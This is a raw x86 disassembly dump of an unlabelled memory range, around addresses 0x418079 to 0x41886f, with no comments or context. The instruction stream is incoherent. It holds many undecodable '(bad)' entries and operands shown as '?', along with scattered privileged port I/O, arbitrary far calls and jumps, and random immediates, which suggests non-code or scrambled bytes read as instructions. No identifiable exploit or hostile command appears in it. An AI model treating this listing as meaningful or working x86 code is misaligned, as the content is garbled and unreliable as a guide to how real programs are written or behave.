  418079:	mov    BYTE PTR [edi+0x1745fc8b],0x55
  418080:	sbb    al,0x2f
  418082:	js     0x4180a3
  418084:	or     ebx,DWORD PTR [ebp+edi*8+0x59c2c3f]
  41808b:	mov    edi,0x110e189f
  418090:	sub    al,BYTE PTR [ebx+0x52309682]
  418096:	cmc    
  418097:	data16 clc 
  418099:	xchg   edi,eax
  41809a:	xrelease xchg DWORD PTR [ecx+0x158f2235],esi
  4180a1:	imul   esi,DWORD PTR [ebx],0xf1db2d62
  4180a7:	xchg   BYTE PTR [ecx+edi*1+0x4e],dl
  4180ab:	xor    esp,DWORD PTR [edi+eiz*1-0x27]
  4180af:	sar    DWORD PTR [esi-0x503becb1],1
  4180b5:	pop    ebx
  4180b6:	ffreep st(3)
  4180b8:	in     al,dx
  4180b9:	stos   BYTE PTR es:[edi],al
  4180ba:	mov    ecx,0x2ee1ba70
  4180bf:	pop    ebx
  4180c0:	jno    0x418130
  4180c2:	aad    0x49
  4180c4:	enter  0xff9,0x10
  4180c8:	and    esp,esi
  4180ca:	in     eax,0x68
  4180cc:	std    
  4180cd:	dec    cx
  4180cf:	xchg   edx,eax
  4180d0:	pop    es
  4180d1:	loop   0x418121
  4180d3:	ss and DWORD PTR ds:[eax],0xffffffea
  4180d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180d9:	xchg   DWORD PTR [ebx+edx*2+0x18],edi
  4180dd:	pop    esi
  4180de:	mov    edx,0x29d72057
  4180e3:	(bad)
  4180e7:	mov    esi,0x9931621f
  4180ec:	sub    eax,DWORD PTR [ebx-0x3cd6e5e0]
  4180f2:	adc    ecx,esi
  4180f4:	rol    esp,1
  4180f6:	mov    dl,BYTE PTR [edx-0x1aa3b5b4]
  4180fc:	and    ch,BYTE PTR [eax+0x1b]
  4180ff:	pop    ebx
  418100:	sbb    ebp,DWORD PTR [ebx]
  418102:	pop    es
  418103:	mov    ch,0x9d
  418105:	sub    eax,0x881e5376
  41810a:	jbe    0x4180ef
  41810c:	xchg   DWORD PTR ds:0x381a66c3,esi
  418112:	and    eax,0x82ce4b24
  418117:	pop    ebp
  418118:	sbb    edx,DWORD PTR [edi-0x21]
  41811b:	and    bh,BYTE PTR [ecx-0x69edcee8]
  418121:	rcl    BYTE PTR [edi+0x58f64a8f],0x6f
  418128:	call   0xc3e4:0xcd675ae9
  41812f:	jp     0x418112
  418131:	push   ebx
  418132:	call   0xd4f4:0xacfcd75a
  418139:	mov    dl,al
  41813b:	fwait
  41813c:	add    al,0x50
  41813e:	aad    0xb2
  418140:	push   edi
  418141:	adc    edi,ecx
  418143:	into   
  418144:	pop    edx
  418145:	mov    ah,0xe7
  418147:	mov    al,0x72
  418149:	jno    0x4181c4
  41814b:	ret    
  41814c:	test   dh,ah
  41814e:	rcr    bl,0xfc
  418151:	scas   al,BYTE PTR es:[edi]
  418152:	pop    ecx
  418153:	enter  0x31b0,0x7
  418157:	mov    ah,0xf1
  418159:	dec    edx
  41815a:	add    al,0x26
  41815c:	dec    esp
  41815d:	into   
  41815e:	in     eax,dx
  41815f:	push   DWORD PTR [ecx+0x31]
  418162:	push   cs
  418163:	jl     0x418143
  418165:	sbb    bl,al
  418167:	cmp    al,0x9a
  418169:	adc    eax,0x5d52e363
  41816e:	push   ecx
  41816f:	pusha  
  418170:	add    esi,DWORD PTR [eax+0x30a2c1e3]
  418176:	mov    dh,0xb8
  418178:	mov    eax,0xf8a2308c
  41817d:	lahf   
  41817e:	jmp    0x5616:0xe17b00f9
  418185:	clc    
  418186:	pop    es
  418187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418188:	(bad)  
  418189:	rcr    ah,1
  41818b:	or     ebx,DWORD PTR [eax]
  41818d:	outs   dx,BYTE PTR ds:[esi]
  41818e:	das    
  41818f:	mov    ecx,0x7a3aebe4
  418194:	cmc    
  418195:	fisub  DWORD PTR [ebp-0x47]
  418198:	sbb    al,0x80
  41819a:	xchg   edi,eax
  41819b:	xchg   esp,eax
  41819c:	mov    eax,0xfbdb3b76
  4181a1:	arpl   WORD PTR [ebp-0x43],sp
  4181a4:	jno    0x418215
  4181a6:	std    
  4181a7:	addr16 mov ah,0x2d
  4181aa:	pop    esp
  4181ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ac:	outs   dx,BYTE PTR ds:[esi]
  4181ad:	into   
  4181ae:	aaa    
  4181af:	adc    esi,DWORD PTR [ecx+0x5ea94e30]
  4181b5:	add    ecx,esi
  4181b7:	gs xor eax,0xb650b891
  4181bd:	pop    esp
  4181be:	mov    ebp,0x2e520aea
  4181c3:	test   eax,0x2120d62f
  4181c9:	jle    0x41823e
  4181cb:	push   edi
  4181cc:	inc    edi
  4181cd:	inc    esp
  4181ce:	in     al,0xe4
  4181d0:	cmp    eax,0x9a12e987
  4181d5:	adc    bh,al
  4181d7:	jo     0x418245
  4181d9:	retf   0x80ee
  4181dc:	push   eax
  4181dd:	ret    0x30af
  4181e0:	inc    ebp
  4181e1:	sbb    DWORD PTR [ebp+0x60],esp
  4181e4:	js     0x418206
  4181e6:	idiv   DWORD PTR [esi+0x13]
  4181e9:	jmp    0x4181ee
  4181eb:	push   edi
  4181ec:	outs   dx,DWORD PTR ds:[esi]
  4181ed:	sbb    al,0x58
  4181ef:	and    cl,BYTE PTR [ecx+0x70730de4]
  4181f5:	mov    ah,0x6f
  4181f7:	add    edx,edi
  4181f9:	adc    eax,0xd453f52f
  4181fe:	inc    edx
  4181ff:	fcom   QWORD PTR [ebx]
  418201:	mov    edx,0xf2825e83
  418206:	shr    esi,1
  418208:	loope  0x41820f
  41820a:	es mov ebx,?
  41820d:	push   ds
  41820e:	mov    DWORD PTR [ebp+0x1c2316fa],ebx
  418214:	call   0x3d7e883a
  418219:	retf   
  41821a:	or     ebp,ecx
  41821c:	push   esp
  41821d:	xchg   edi,eax
  41821e:	and    dh,0x4
  418221:	mov    dl,0xfb
  418223:	sbb    ecx,DWORD PTR [ebp+0x4]
  418226:	add    DWORD PTR [eax],0x50794979
  41822c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41822d:	test   edx,esp
  41822f:	cs test eax,0xec17acb3
  418235:	repnz aas 
  418237:	arpl   WORD PTR [ebp+0x7887f270],di
  41823d:	aaa    
  41823e:	sub    bl,BYTE PTR [esi+esi*2]
  418241:	push   es
  418242:	(bad)  
  418243:	std    
  418244:	dec    edi
  418245:	arpl   si,sp
  418247:	rcl    BYTE PTR [eax+edi*4+0x68bab57e],0x58
  41824f:	xor    ebp,edx
  418251:	jo     0x418267
  418253:	in     al,dx
  418254:	xor    eax,0xf0d0c2d2
  418259:	dec    esi
  41825a:	inc    ebx
  41825b:	mov    ecx,0x38d898ba
  418260:	jle    0x4182ad
  418262:	cld    
  418263:	adc    al,0x26
  418265:	mov    dl,0x8d
  418267:	push   ebx
  418268:	mov    BYTE PTR [ebx-0x6ff7c646],bl
  41826e:	mov    ebx,0xb9f09140
  418273:	mov    ch,0xd6
  418275:	rcr    BYTE PTR [edx],cl
  418277:	adc    ch,cl
  418279:	xchg   esp,eax
  41827a:	dec    BYTE PTR [esi]
  41827c:	cld    
  41827d:	mov    dl,0xa4
  41827f:	and    BYTE PTR [edx-0x28],bl
  418282:	sub    BYTE PTR [ecx+0x6158f77c],ch
  418288:	test   BYTE PTR [ecx+edx*1],al
  41828b:	out    0x63,eax
  41828d:	(bad)  
  41828e:	pusha  
  41828f:	jae    0x41821d
  418291:	repnz cmc 
  418293:	dec    ebp
  418294:	xor    DWORD PTR [esi+ebp*2+0x3f],0x1b
  418299:	push   0x23
  41829b:	in     eax,0xe1
  41829d:	push   ebp
  41829e:	dec    esp
  41829f:	pop    edx
  4182a0:	popa   
  4182a1:	mov    dl,BYTE PTR [ecx+esi*2]
  4182a4:	mov    DWORD PTR [esi],ecx
  4182a6:	scas   al,BYTE PTR es:[edi]
  4182a7:	pop    ss
  4182a8:	outs   dx,BYTE PTR ds:[esi]
  4182a9:	fmul   st,st(3)
  4182ab:	test   eax,0x3d21f1c2
  4182b0:	dec    esi
  4182b1:	sub    BYTE PTR [eax+0x67],0xff
  4182b5:	lock xor eax,0x167e60b4
  4182bb:	dec    esp
  4182bc:	xor    ah,cl
  4182be:	cmp    al,0x43
  4182c0:	add    al,0x64
  4182c2:	inc    esp
  4182c3:	imul   ebp,DWORD PTR [ebx+0x10fca3e2],0x61
  4182ca:	es xchg ecx,eax
  4182cc:	push   ecx
  4182cd:	mov    ds:0x51696d6,eax
  4182d2:	mov    ecx,DWORD PTR [ebx]
  4182d4:	pop    esi
  4182d5:	jnp    0x418347
  4182d7:	aad    0x3d
  4182d9:	std    
  4182da:	loope  0x41831f
  4182dc:	aad    0xdb
  4182de:	and    DWORD PTR [ecx],esp
  4182e0:	push   ebp
  4182e1:	jne    0x4182c4
  4182e3:	in     al,dx
  4182e4:	jge    0x41834d
  4182e6:	pop    eax
  4182e7:	inc    ecx
  4182e8:	les    esi,FWORD PTR [edx-0x30]
  4182eb:	(bad)  
  4182ec:	jmp    0x9fc4731f
  4182f1:	retf   0xd882
  4182f4:	sub    al,0x2e
  4182f6:	mov    edx,0x4804808b
  4182fb:	je     0x4182d1
  4182fd:	out    0xd1,al
  4182ff:	xor    DWORD PTR [edi],esi
  418301:	push   ecx
  418302:	push   eax
  418303:	inc    esi
  418304:	les    edi,FWORD PTR [edx]
  418306:	xor    ebx,DWORD PTR [ecx-0x35428467]
  41830c:	mov    dh,0x2e
  41830e:	pop    esp
  41830f:	ret    0xac87
  418312:	(bad)
  418316:	cmp    dl,BYTE PTR [esi-0xa]
  418319:	je     0x4182eb
  41831b:	mov    ds:0x51b8e792,eax
  418320:	add    ecx,DWORD PTR [edx-0x29]
  418323:	mov    dl,0x12
  418325:	inc    edi
  418326:	fnstsw WORD PTR [edi]
  418328:	push   edi
  418329:	inc    ebx
  41832a:	cmp    BYTE PTR [esi+ecx*1],dl
  41832d:	mov    esp,0xea028fed
  418332:	inc    edi
  418333:	mov    ?,ebx
  418335:	push   0xffffff97
  418337:	sar    BYTE PTR [edi+0x59],1
  41833a:	fnstenv [ebp-0x48da1ae1]
  418340:	mov    esi,edx
  418342:	(bad)  
  418343:	test   edx,0x128c84f0
  418349:	mov    al,0x3c
  41834b:	popf   
  41834c:	cmc    
  41834d:	clc    
  41834e:	js     0x418388
  418350:	or     BYTE PTR [edi+0x5c],dh
  418353:	sbb    BYTE PTR [ecx],dl
  418355:	sar    DWORD PTR [edx-0x62],1
  418358:	or     eax,0x2bfadf0c
  41835d:	jl     0x4183db
  41835f:	or     al,0x35
  418361:	push   ebx
  418362:	mov    DWORD PTR [ecx],edi
  418364:	or     edx,DWORD PTR [ecx+0x57]
  418367:	lds    esi,FWORD PTR [ebx-0x3c6cd932]
  41836d:	add    BYTE PTR [esi],bh
  41836f:	fnstenv [ebx+0x15]
  418372:	cmp    al,0x7b
  418374:	test   DWORD PTR [ebx+0x5a873d2b],eax
  41837a:	sbb    DWORD PTR [esp+ebx*4],edi
  41837d:	fisttp DWORD PTR [ebp+eiz*1+0x2cec55e7]
  418384:	popf   
  418385:	sub    eax,0x6f99e6d3
  41838a:	rcr    DWORD PTR [ebx+eax*1+0x2937b88],1
  418391:	repnz and BYTE PTR [ebx+0x5],cl
  418395:	cli    
  418396:	cmp    BYTE PTR [ebp+0x44aa5806],0xe2
  41839d:	int3   
  41839e:	push   0x2f
  4183a0:	stos   DWORD PTR es:[edi],eax
  4183a1:	fisub  DWORD PTR [edi-0x53c235d3]
  4183a7:	ret    0xdb66
  4183aa:	and    eax,0xf4679ae5
  4183af:	mov    cl,0x56
  4183b1:	add    DWORD PTR [edx],edx
  4183b3:	rcr    DWORD PTR [ecx],0xdc
  4183b6:	or     BYTE PTR [esi],0x7c
  4183b9:	fldcw  WORD PTR [esi-0x5]
  4183bc:	push   0x15
  4183be:	out    dx,eax
  4183bf:	(bad)
  4183c2:	mov    dh,0x11
  4183c4:	add    ch,BYTE PTR [ecx]
  4183c6:	adc    BYTE PTR [ecx+0x40eb1200],cl
  4183cc:	adc    dl,BYTE PTR [ebx-0x1b]
  4183cf:	xor    esp,eax
  4183d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d2:	jno    0x41843e
  4183d4:	retf   
  4183d5:	stos   BYTE PTR es:[edi],al
  4183d6:	cmp    al,BYTE PTR [ebp+ecx*1-0x156d72a]
  4183dd:	imul   edx,DWORD PTR [ebx+0x2d],0x344d1e93
  4183e4:	(bad)  
  4183e5:	in     al,dx
  4183e6:	jae    0x418420
  4183e8:	adc    BYTE PTR [edx+0x10deb767],ah
  4183ee:	and    al,0xec
  4183f0:	and    esp,DWORD PTR [eax-0x3b10f160]
  4183f6:	adc    esi,DWORD PTR [esp+edx*8]
  4183f9:	adc    eax,0x19cb2887
  4183fe:	int    0x50
  418400:	pop    DWORD PTR [eax]
  418402:	sar    esi,1
  418404:	imul   edx,eax,0x1d
  418407:	mov    esi,0x4078546
  41840c:	add    ebp,0xffffffe6
  41840f:	rcr    DWORD PTR [eax-0x35],1
  418412:	cs ss leave 
  418415:	jecxz  0x4183ae
  418417:	je     0x4183b5
  418419:	push   ecx
  41841a:	xor    DWORD PTR [edi-0x6b],ebx
  41841d:	and    ebp,0xffffffc6
  418420:	pop    ebp
  418421:	pop    esi
  418422:	rcr    BYTE PTR ss:[ecx+0x1608df0b],0xed
  41842a:	out    dx,eax
  41842b:	fistp  DWORD PTR [esi]
  41842d:	inc    ebx
  41842e:	push   esp
  41842f:	addr16 out 0x3,al
  418432:	pop    ds
  418433:	push   ebp
  418434:	sub    eax,0xe4a4d850
  418439:	dec    eax
  41843a:	ja     0x41848b
  41843c:	jle    0x4183f8
  41843e:	mov    WORD PTR [edx+0x4d311eed],?
  418444:	inc    ecx
  418445:	xchg   ebx,eax
  418446:	popf   
  418447:	mov    edi,0xe99986da
  41844c:	loopne 0x418401
  41844e:	das    
  41844f:	iret   
  418450:	pop    edx
  418451:	arpl   WORD PTR [esi],sp
  418453:	jp     0x41842f
  418455:	mov    ebx,0x59882387
  41845a:	sub    edi,DWORD PTR [edi]
  41845c:	in     eax,0x28
  41845e:	rcr    dl,1
  418460:	daa    
  418461:	mov    cl,0x3e
  418463:	dec    esp
  418464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418465:	lds    ecx,FWORD PTR [ebp-0x4fc11dc]
  41846b:	pop    ss
  41846c:	jnp    0x41842d
  41846e:	mov    cl,0xb6
  418470:	adc    eax,0x460edbc2
  418475:	out    dx,al
  418476:	push   ecx
  418477:	fs mov ch,0x17
  41847a:	ret    
  41847b:	and    BYTE PTR [ecx-0x25],dh
  41847e:	mov    eax,0xee041b48
  418483:	mov    cl,0x15
  418485:	cmp    al,0x71
  418487:	ja     0x4184b6
  418489:	adc    bh,dh
  41848b:	pusha  
  41848c:	mov    edi,0xef7ed487
  418491:	cmp    eax,0x7b6ce58d
  418496:	imul   ecx,ebp,0x33
  418499:	push   es
  41849a:	loopne 0x4184e3
  41849c:	add    ebp,DWORD PTR [ebx]
  41849e:	shl    BYTE PTR [ebp+0xb],cl
  4184a1:	mov    ah,0x14
  4184a3:	jne    0x418476
  4184a5:	xchg   edi,eax
  4184a6:	pop    ebx
  4184a7:	mov    WORD PTR [eax+ecx*8],cs
  4184aa:	rcl    ah,cl
  4184ac:	inc    esi
  4184ad:	stc    
  4184ae:	or     eax,DWORD PTR [esi-0x55788381]
  4184b4:	mov    edi,ds
  4184b6:	(bad)  
  4184b7:	loope  0x418488
  4184b9:	or     DWORD PTR [edi],0x5d
  4184bc:	sbb    bh,al
  4184be:	ins    BYTE PTR es:[edi],dx
  4184bf:	cmp    ebx,ecx
  4184c1:	repnz mov ecx,DWORD PTR [ebp+ecx*4-0x5e]
  4184c6:	mov    bh,0x66
  4184c8:	retf   
  4184c9:	ds sahf 
  4184cb:	sbb    ecx,0xe172ed9e
  4184d1:	outs   dx,DWORD PTR ds:[esi]
  4184d2:	push   esp
  4184d3:	mov    dl,0x8c
  4184d5:	ret    
  4184d6:	mov    dh,0x1b
  4184d8:	in     eax,dx
  4184d9:	and    si,WORD PTR [ebp+0x46]
  4184dd:	adc    BYTE PTR [ebp-0x61d4532d],ch
  4184e3:	pop    ebx
  4184e4:	lods   al,BYTE PTR ds:[esi]
  4184e5:	daa    
  4184e6:	aas    
  4184e7:	ins    DWORD PTR es:[edi],dx
  4184e8:	jmp    0x6e516573
  4184ed:	adc    bh,BYTE PTR [esi+0x16]
  4184f0:	icebp  
  4184f1:	jl     0x41852f
  4184f3:	xchg   DWORD PTR [eax],edi
  4184f5:	xchg   ebp,eax
  4184f6:	(bad)  
  4184f7:	mov    esi,DWORD PTR [eax+0x36]
  4184fa:	cld    
  4184fb:	mov    cl,0x2f
  4184fd:	arpl   WORD PTR [ecx+0x3e],cx
  418500:	psrld  mm5,QWORD PTR [ebp+0x5775fd0f]
  418507:	pop    esp
  418508:	mov    al,ds:0xab2947aa
  41850d:	cli    
  41850e:	rcl    DWORD PTR [ebx-0x65],0x9f
  418512:	shl    DWORD PTR ds:0xfccec541,0xdb
  418519:	mov    eax,ds:0x53d5afd6
  41851e:	shl    ebx,0x18
  418521:	nop
  418522:	push   cs
  418523:	mov    dh,0x94
  418525:	add    al,BYTE PTR [ebx+0x6097f80f]
  41852b:	jb     0x4184bb
  41852d:	sahf   
  41852e:	es int 0xe8
  418531:	pop    edx
  418532:	pop    esi
  418533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418534:	fs fwait
  418536:	jae    0x4185b2
  418538:	fadd   QWORD PTR [edi-0x13]
  41853b:	ins    BYTE PTR es:[edi],dx
  41853c:	push   ds
  41853d:	jo     0x41857d
  41853f:	jbe    0x41852d
  418541:	es jmp 0xbd0f:0xc200bad4
  418549:	repz mov esi,0xf99f4682
  41854f:	fdivr  DWORD PTR [esi]
  418551:	mov    ch,BYTE PTR [eax]
  418553:	cmp    esi,DWORD PTR [ecx+0xc]
  418556:	call   0x73552b43
  41855b:	sub    al,0x7a
  41855d:	cmp    al,cl
  41855f:	retf   0x4cfa
  418562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418563:	addr16 das 
  418565:	sub    BYTE PTR [edx],dl
  418567:	adc    DWORD PTR [edi+0x561d8e68],esp
  41856d:	adc    BYTE PTR [esi-0x51312cc0],cl
  418573:	dec    ebp
  418574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418575:	mov    ebx,0x9ca1c78d
  41857a:	test   eax,0x1efd5328
  41857f:	sub    DWORD PTR [edi-0xa],esi
  418582:	jg     0x41858c
  418584:	ret    
  418585:	push   ss
  418586:	push   ss
  418587:	inc    edx
  418588:	xor    DWORD PTR [edx-0x3d],ebx
  41858b:	cwde   
  41858c:	jb     0x41853c
  41858e:	push   edx
  41858f:	psrad  mm3,QWORD PTR [esi+0x1d]
  418593:	jle    0x41857f
  418595:	cmp    DWORD PTR [ecx-0x30220e0c],ebp
  41859b:	jp     0x418565
  41859d:	dec    edx
  41859e:	cmp    eax,0xe85f208c
  4185a3:	icebp  
  4185a4:	fwait
  4185a5:	jo     0x4185ab
  4185a7:	in     eax,0xca
  4185a9:	mov    dl,0xa0
  4185ab:	(bad)  
  4185ac:	lea    ebx,[ebx-0x32]
  4185af:	xchg   edx,eax
  4185b0:	inc    esi
  4185b1:	mov    cl,al
  4185b3:	mov    ah,BYTE PTR [ecx+0x38]
  4185b6:	ds cs aad 0xfa
  4185ba:	lahf   
  4185bb:	rcr    BYTE PTR [eax+0x4da7cbff],0xb0
  4185c2:	pop    esp
  4185c3:	mov    cl,0xd5
  4185c5:	(bad)  
  4185c7:	add    bh,bh
  4185c9:	enter  0xc415,0x95
  4185cd:	mov    esi,0x52ece33
  4185d2:	adc    BYTE PTR [eax],dl
  4185d4:	lods   al,BYTE PTR ds:[esi]
  4185d5:	pushf  
  4185d6:	ret    0x33be
  4185d9:	dec    eax
  4185da:	int    0xc5
  4185dc:	pop    ds
  4185dd:	push   0xffffffbc
  4185df:	mov    esi,0x98282599
  4185e4:	aas    
  4185e5:	adc    al,0xd4
  4185e7:	enter  0xddb3,0xd8
  4185eb:	cmp    eax,0x840e634a
  4185f0:	repz xchg bx,ax
  4185f3:	cmc    
  4185f4:	sbb    DWORD PTR [ebp+esi*8+0x22],esi
  4185f8:	mov    al,ds:0x40b120e6
  4185fd:	mov    al,0x53
  4185ff:	fadd   st,st(3)
  418601:	sbb    dh,BYTE PTR [ebx+0x6c]
  418604:	in     al,dx
  418605:	aam    0xce
  418607:	nop
  418608:	xor    cl,BYTE PTR [ebp-0x65e0e8a2]
  41860e:	add    esp,0x1
  418611:	xchg   DWORD PTR [eax],edx
  418613:	pop    esi
  418614:	fbld   TBYTE PTR [ebp+0x24cbac84]
  41861a:	icebp  
  41861b:	cmp    BYTE PTR [eax-0x33],ch
  41861e:	jmp    0x4185ae
  418620:	stos   DWORD PTR es:[edi],eax
  418621:	pusha  
  418622:	xchg   ecx,eax
  418623:	cmp    DWORD PTR [eax-0xc549372],eax
  418629:	and    ch,bl
  41862b:	xchg   esi,ebx
  41862d:	popa   
  41862e:	cmp    eax,0x363d0691
  418633:	sub    DWORD PTR [ecx+edi*1-0x46269663],ebx
  41863a:	xor    eax,0x5842e072
  41863f:	stos   BYTE PTR es:[edi],al
  418640:	jne    0x4185d7
  418642:	add    cl,BYTE PTR [eax+ecx*2-0x4eb4dd9]
  418649:	scas   eax,DWORD PTR es:[edi]
  41864a:	or     DWORD PTR [ecx+0x51],edi
  41864d:	add    cl,BYTE PTR [edi]
  41864f:	xchg   edx,eax
  418650:	pop    edx
  418651:	push   ebp
  418652:	ins    DWORD PTR es:[edi],dx
  418653:	or     bh,BYTE PTR [edi]
  418655:	inc    ecx
  418656:	fist   WORD PTR [edx+0x45]
  418659:	jae    0x41866d
  41865b:	gs (bad) 
  41865d:	jp     0x4186ae
  41865f:	shl    DWORD PTR [eax+edx*8-0x39],1
  418663:	mov    BYTE PTR ds:0xd4cb3efc,bl
  418669:	fnstenv [edi]
  41866b:	add    al,0x6e
  41866d:	fdivr  QWORD PTR ds:0xd4e2ee77
  418673:	xchg   BYTE PTR [edi+0x23],ch
  418676:	inc    esp
  418677:	mov    DWORD PTR [esi+0x4d],ebx
  41867a:	clc    
  41867b:	scas   eax,DWORD PTR es:[edi]
  41867c:	stos   DWORD PTR es:[edi],eax
  41867d:	pop    edx
  41867e:	inc    esi
  41867f:	mov    ebp,0x671fe163
  418684:	data16 sti 
  418686:	or     bl,BYTE PTR ds:0x831d88ce
  41868c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41868d:	or     BYTE PTR ds:0xd8e33d96,dh
  418693:	pop    ds
  418694:	pop    ss
  418695:	push   ebp
  418696:	inc    ebp
  418697:	adc    eax,0x377c8378
  41869c:	retf   
  41869d:	xor    eax,0x16b06d28
  4186a2:	push   ds
  4186a3:	cmp    eax,DWORD PTR ds:0x571c725a
  4186a9:	mov    al,0xb8
  4186ab:	test   DWORD PTR [edx],edx
  4186ad:	pop    ecx
  4186ae:	ret    0xcd98
  4186b1:	popa   
  4186b2:	ins    DWORD PTR es:[edi],dx
  4186b3:	add    edi,ecx
  4186b5:	push   eax
  4186b6:	ss pop edx
  4186b8:	rcl    BYTE PTR ds:0xc9042354,1
  4186be:	or     DWORD PTR [esi-0x5dd3b806],edx
  4186c4:	nop
  4186c5:	sub    edx,ecx
  4186c7:	shl    DWORD PTR [ebx+0x66],1
  4186ca:	aam    0x97
  4186cc:	fcmovb st,st(2)
  4186ce:	pop    es
  4186cf:	push   es
  4186d0:	aas    
  4186d1:	mov    ebp,0x295c256f
  4186d6:	xor    bl,bl
  4186d8:	popa   
  4186d9:	jmp    0x418738
  4186db:	adc    al,BYTE PTR [ebx+0x43]
  4186de:	mov    bl,BYTE PTR [edi]
  4186e0:	push   esp
  4186e1:	push   ebp
  4186e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186e3:	ds aas 
  4186e5:	xor    bh,ah
  4186e7:	(bad)  ds:0x2cfaaa16
  4186ed:	cmp    dh,bh
  4186ef:	cdq    
  4186f0:	ss adc al,0xbb
  4186f3:	mov    ds:0xb08510c6,eax
  4186f8:	add    al,0x2f
  4186fa:	into   
  4186fb:	cmp    DWORD PTR [ebp-0x4f],0x24
  4186ff:	lods   al,BYTE PTR ds:[esi]
  418700:	or     eax,0xf6bbf462
  418705:	fisttp QWORD PTR [edi]
  418707:	fwait
  418708:	call   0x3d79:0x29b09f64
  41870f:	mov    bl,0xb
  418711:	inc    ebp
  418712:	fistp  DWORD PTR fs:[eax+esi*4-0x19c711c1]
  41871a:	xchg   edx,eax
  41871b:	mov    WORD PTR [edi-0x3402c4ab],?
  418721:	xchg   ebp,eax
  418722:	stos   BYTE PTR es:[edi],al
  418723:	hlt    
  418724:	fcomp  QWORD PTR [edi]
  418726:	or     bh,BYTE PTR [edx+0x39]
  418729:	cmp    eax,0x5b16d8bc
  41872e:	fwait
  41872f:	test   al,0x4b
  418731:	and    BYTE PTR [ecx+0x927efc2],cl
  418737:	ror    DWORD PTR [edx+esi*4],cl
  41873a:	sbb    BYTE PTR [edi+0x1a],bh
  41873d:	ror    DWORD PTR [esi],0xe7
  418740:	js     0x418703
  418742:	xor    DWORD PTR [esi],esp
  418744:	aad    0x2e
  418746:	pop    es
  418747:	mov    dl,0xe6
  418749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41874a:	inc    ecx
  41874b:	(bad)  
  41874c:	add    bl,dl
  41874e:	dec    DWORD PTR [esi]
  418750:	or     eax,0xa3394533
  418755:	fneni(8087 only) 
  418757:	mov    eax,0x8386ffe1
  41875c:	pop    ecx
  41875d:	xor    eax,0xa43448d
  418762:	add    ebx,DWORD PTR [ecx+0x46]
  418765:	xor    BYTE PTR fs:[ebx],ch
  418768:	lods   eax,DWORD PTR ds:[esi]
  418769:	lock aam 0x82
  41876c:	mov    BYTE PTR [eax-0x89ac2f8],ch
  418772:	in     al,0x8b
  418774:	in     al,0x9f
  418776:	or     DWORD PTR [esi+0x2e45ba95],0x21
  41877d:	lds    ecx,FWORD PTR [esi-0x26]
  418780:	mov    es,WORD PTR [ecx+0x6a511bec]
  418786:	mov    ah,ch
  418788:	fimul  DWORD PTR [edx+0x55b956ab]
  41878e:	outs   dx,BYTE PTR ds:[esi]
  41878f:	xor    bh,0x6f
  418792:	ror    DWORD PTR [eax],cl
  418794:	jl     0x4187b0
  418796:	pop    ecx
  418797:	mov    eax,0x8d1f08fc
  41879c:	or     al,0xd2
  41879e:	push   ds
  41879f:	dec    ebx
  4187a0:	add    ah,BYTE PTR [esi+eiz*8]
  4187a3:	jmp    0x91587ea7
  4187a8:	and    al,0x61
  4187aa:	push   esi
  4187ab:	sub    eax,DWORD PTR [edx]
  4187ad:	(bad)  
  4187ae:	icebp  
  4187af:	loope  0x418830
  4187b1:	mov    esi,DWORD PTR [ebx]
  4187b3:	xchg   bh,al
  4187b5:	test   eax,0x17f7ea50
  4187ba:	sbb    BYTE PTR [edi+0x6a0149d7],0xe8
  4187c1:	add    edi,DWORD PTR [eax+0x288ba733]
  4187c7:	mov    edi,ds
  4187c9:	cmc    
  4187ca:	fadd   st,st(3)
  4187cc:	in     al,0x4d
  4187ce:	fdivr  QWORD PTR [ecx-0x7d]
  4187d1:	fidiv  WORD PTR [ebx-0x4c]
  4187d4:	mov    esi,0xcfb166dc
  4187d9:	mov    eax,0xc2faf68f
  4187de:	out    dx,eax
  4187df:	dec    eax
  4187e0:	lds    ecx,FWORD PTR [esi+eax*2+0x597fa962]
  4187e7:	rcr    ecx,1
  4187e9:	mov    ds:0xd152fe1f,al
  4187ee:	and    al,0xef
  4187f0:	inc    edx
  4187f1:	ret    0x1e24
  4187f4:	mov    esi,0xb924d9e7
  4187f9:	jo     0x418798
  4187fb:	mov    edx,0x40d5c661
  418800:	leave  
  418801:	xchg   ebx,eax
  418802:	xchg   edi,eax
  418803:	lea    esi,[ebp+0x4ab2e0e0]
  418809:	sub    esp,DWORD PTR [ebx+0x35]
  41880c:	push   0x1f
  41880e:	jl     0x4187c6
  418810:	cld    
  418811:	test   al,0xfe
  418813:	dec    ebx
  418814:	dec    edx
  418815:	xchg   edi,eax
  418816:	sub    al,0x8d
  418818:	adc    DWORD PTR [ebx+0x61],ebx
  41881b:	gs fcmovne st,st(1)
  41881e:	rol    BYTE PTR [ecx+0x4376ca11],cl
  418824:	cmp    al,0x4b
  418826:	fbstp  TBYTE PTR [esi]
  418828:	and    al,0x6b
  41882a:	dec    esi
  41882b:	pop    ecx
  41882c:	ret    
  41882d:	dec    ecx
  41882e:	out    dx,eax
  41882f:	test   eax,0xa90d72f8
  418834:	nop
  418835:	sti    
  418836:	into   
  418837:	jmp    0xa7c:0x1afe5442
  41883e:	outs   dx,DWORD PTR ds:[esi]
  41883f:	or     eax,0xfdbb9f2d
  418844:	sar    DWORD PTR [ebx-0x49f054d0],0x80
  41884b:	ins    BYTE PTR es:[edi],dx
  41884c:	jmp    0x1a4fcf23
  418851:	loop   0x418882
  418853:	mov    ebp,fs
  418855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418856:	in     eax,0xe6
  418858:	inc    edi
  418859:	jnp    0x41883c
  41885b:	adc    al,0x5
  41885d:	dec    ebx
  41885e:	mov    ah,BYTE PTR [edx+0x17]
  418861:	xchg   ebx,eax
  418862:	outs   dx,BYTE PTR ds:[esi]
  418863:	ficom  DWORD PTR [edi+0x51c0f4b5]
  418869:	imul   DWORD PTR [ecx+0x5073b4b6]
  41886f:	test   BYTE PTR [eax-0x33615a84],bl
